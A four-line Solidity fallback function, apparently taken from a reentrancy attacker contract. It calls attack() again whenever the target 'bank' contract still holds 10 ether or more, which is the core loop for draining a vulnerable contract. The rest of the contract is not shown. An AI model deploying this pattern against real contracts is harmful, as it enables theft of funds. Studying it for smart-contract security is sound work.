function () external payable {
    if (address(bank).balance >= 10 ether) {
        attack();
    }
}
